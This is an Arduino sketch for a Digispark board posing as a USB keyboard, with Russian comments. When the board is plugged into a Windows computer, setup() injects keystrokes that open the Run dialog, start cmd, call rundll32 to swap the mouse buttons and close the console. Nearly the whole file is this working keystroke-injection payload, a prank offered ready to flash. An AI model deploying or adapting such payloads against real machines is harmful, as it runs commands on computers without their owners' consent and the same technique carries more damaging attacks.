#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_RIGHT); //Windows + R
    DigiKeyboard.delay(70); // Задержка 70 ms
    DigiKeyboard.println("cmd"); //запуск коммандной строки
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Enter
    DigiKeyboard.delay(70); // Задержка 70 ms до запуска cmd
    DigiKeyboard.println("%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul"); //смена клавиш мыши
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Enter
    DigiKeyboard.println("exit"); //закрытие cmd
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Enter
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  // DigiKeyboard.sendKeyStroke(0);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  // DigiKeyboard.println("Hello Digispark!");
  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  // DigiKeyboard.delay(5000);
}
